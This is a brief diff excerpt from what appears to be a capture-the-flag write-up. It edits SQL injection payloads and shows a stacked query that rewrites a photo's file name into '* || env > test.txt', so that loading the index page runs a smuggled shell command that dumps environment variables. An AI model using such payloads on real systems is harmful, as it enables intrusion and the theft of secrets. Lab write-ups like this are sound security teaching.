@@ -69,7 +69,7 @@ id=1;UPDATE photos SET filename='* || env > test.txt' WHERE id=3;COMMIT;--
 Visit **INDEX** page to execute the command.
 
 ```sql
-id=1 UNION SELECT 'test'--
+id=1.1 UNION SELECT 'test.txt'--
 ```
 
 Here we got all 3 flags in one place.
